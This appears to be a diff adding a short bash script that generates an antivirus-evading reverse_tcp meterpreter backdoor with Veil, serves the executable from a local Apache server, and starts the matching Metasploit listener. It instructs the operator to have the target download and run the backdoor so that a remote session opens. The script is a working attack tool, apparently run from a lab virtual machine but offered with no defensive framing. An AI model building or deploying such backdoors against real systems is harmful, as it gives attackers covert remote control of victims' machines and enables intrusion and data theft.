@@ -1,0 +1,21 @@
+#!/bin/bash
+echo "~~Script Description: This script with autogenerate a reverse_tcp backdoor, and start the corresponding metasploit listener using the resource file created with the backdoor.\n"
+read -p "~~Please name your backdoor: " filename
+echo "~~Once everything is ready, go to the target device and download the backdoor from http://10.0.2.15/files/$filename.exe, then run it to see a session opened in the metasploit"
+localIP=`ifconfig | awk 'FNR==2{print $2}'`
+service apache2 start
+echo "Apache2 server started."
+rm -f /var/lib/veil/output/compiled/$filename.exe
+rm -f /var/lib/veil/output/handlers/$filename.rc
+rm -f /var/lib/veil/output/source/filename.go
+rm -f /var/www/html/files/$filename.exe
+cd /opt/Veil/
+./Veil.py -t evasion -p go/meterpreter/rev_tcp.py --ip $localIP -c LHOST=$localIP LPORT=4444 -o $filename
+cd
+cp -f /var/lib/veil/output/compiled/$filename.exe /var/www/html/files/
+cd ..
+msfconsole -q -r /var/lib/veil/output/handlers/$filename.rc
+
+
+
+
